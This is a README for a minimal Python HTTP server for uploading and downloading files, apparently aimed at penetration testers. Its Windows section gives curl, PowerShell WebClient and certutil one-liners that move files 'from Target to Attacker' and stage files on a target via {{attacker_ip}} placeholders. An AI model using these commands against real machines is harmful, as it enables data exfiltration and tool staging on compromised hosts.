# 🔁 Advanced File Transfer Server

A lightweight, cross-platform, zero-dependency HTTP server written in Python that enables file upload and download from any system via a web browser or command line. Perfect for sharing files across local networks quickly and safely (for trusted environments).

---

## ✅ Features

- 📂 Browse directories via a web browser  
- 📥 Download files via direct links  
- ⬆️ Upload files via web interface  
- 🧾 Upload files via `curl` using the `PUT` method  
- 📁 Uploaded files respect the path based on browser or CLI context  
- ⚙️ Works on **Linux**, **macOS**, and **Windows**  
- 🚫 100% standard Python no third-party dependencies  

---

## 💻 Requirements

- Python 3.x (tested on 3.6+)  
- Open network port (default: `8080`)  
- No installation or configuration required  

---

## 🚀 Getting Started

### Clone or Download
```bash
git clone https://github.com/Chittu13/File_Transfer.git
cd File_Transfer
python3 Httpseever3.py
#Or

python2 Httpserver2.py
```


## 🌐 Web Interface

- Open `http://<your-ip>:8080/` in your browser  
- Navigate folders by clicking on links  
- Use the upload form to send files to the current folder  
- Uploaded files are saved in the **current folder you are viewing**  

---

## 📤 Upload & Download via Command Line

### Linux

#### Upload
```bash
curl -T file http://<attacker-ip>:8080/
```

#### Download
```bash
wget http://<attacker-ip>:8080/file.txt
```

### Windows

#### Upload 
```powershell
# Windows: Upload Files from Target to Attacker
# Upload via cURL (Windows 10+)
curl -T C:\Users\Public\file.txt http://{{attacker_ip}}:{{my_port}}/file.txt

# Upload via PowerShell WebClient
(New-Object System.Net.WebClient).UploadFile("http://{{attacker_ip}}:{{my_port}}/file.txt", "PUT", "C:\Users\chitt\Desktop\report.txt")

# Upload via CMD (inline PowerShell)
powershell -c "(New-Object System.Net.WebClient).UploadFile('http://{{attakcer_ip}}:{{my_port}}/file.txt','PUT','C:\Users\chitt\Desktop\report.txt')"
```

#### Download 
```powershell
# Windows: Download file from attacker -> target

# PowerShell (Win7+, modern & reliable)
Invoke-WebRequest -Uri "http://{{target_ip}}:{{my_port}}/file.txt" -OutFile "C:\Users\Public\file.txt"

# CMD or PowerShell (works everywhere, older trick)
certutil -urlcache -split -f "http://{{target_ip}}:{{my_port}}/file.txt" "C:\Users\Public\file.txt"

# CMD or PowerShell (Win10+/Server2019+ only)
curl -o C:\Users\Public\file.txt http://{{target_ip}}:{{my_port}}/file.txt
```

## 🛡 Security Warning

⚠️ This tool is **not secure for public or internet-facing use**:  

- No authentication or encryption  
- No user restrictions  
- Anyone on the network can access, upload, or download files  

✅ **Use only:**  

- On local networks  
- With trusted users  
- In controlled environments
